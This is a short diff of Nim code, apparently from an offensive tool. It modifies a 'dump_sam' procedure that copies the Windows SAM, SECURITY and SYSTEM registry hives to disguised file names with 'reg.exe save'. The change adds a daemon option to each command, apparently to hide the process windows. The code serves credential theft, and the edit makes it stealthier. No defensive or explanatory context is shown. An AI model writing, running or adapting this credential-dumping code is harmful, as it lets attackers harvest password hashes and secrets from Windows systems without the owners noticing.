@@ -339,9 +339,9 @@ proc dump_sam(): bool =
     var sec_file = "s.ec"
     var sys_file = "s.ys"
 
-    if execCmdEx(r"reg.exe save hklm\sam " & sam_file).exitCode == 0 and 
-    execCmdEx(r"reg.exe save hklm\security " & sec_file).exitCode == 0 and 
-    execCmdEx(r"reg.exe save hklm\system " & sys_file).exitCode == 0:
+    if execCmdEx(r"reg.exe save hklm\sam " & sam_file, options={poDaemon}).exitCode == 0 and 
+    execCmdEx(r"reg.exe save hklm\security " & sec_file, options={poDaemon}).exitCode == 0 and 
+    execCmdEx(r"reg.exe save hklm\system " & sys_file, options={poDaemon}).exitCode == 0:
         is_success = true
     else:
         is_success = false
